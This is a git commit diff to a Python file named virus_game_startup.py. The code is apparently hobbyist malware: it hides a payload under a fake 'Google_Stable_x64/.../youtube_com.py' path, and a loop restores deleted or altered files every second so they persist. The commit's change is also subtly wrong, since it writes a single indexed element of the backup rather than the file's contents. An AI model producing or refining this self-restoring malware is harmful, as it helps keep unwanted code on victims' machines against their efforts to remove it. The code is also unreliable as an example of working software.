35e18e096662799cf41180fd96858c3a3323e473
Peter Brilla <ppeter.brilla@gmail.com>
2025-10-31 14:24:00 +0100

    Fixed

--- src/virus_game_startup.py
+++ src/virus_game_startup.py
@@ -12,7 +12,7 @@ files_to_backup = [
 ]
 print("Checkpoint2")
 
-backuped_files = [open(path, "r").read() for path, _ in files_to_backup]
+backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
 virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py".replace("/", "\\")
 
@@ -27,8 +27,8 @@ while True:
   for index, file_paths in enumerate(files_to_backup):
     backup = backuped_files[index]
     for path in file_paths:
-      if not os.path.exists(path) or open(path, "r").read() != backup:
-        with open(path, "w") as file:
-          file.write(path)
+      if not os.path.exists(path) or open(path, "rb").read() != backup:
+        with open(path, "wb") as file:
+          file.write(backup[index])
   time.sleep(1)
 
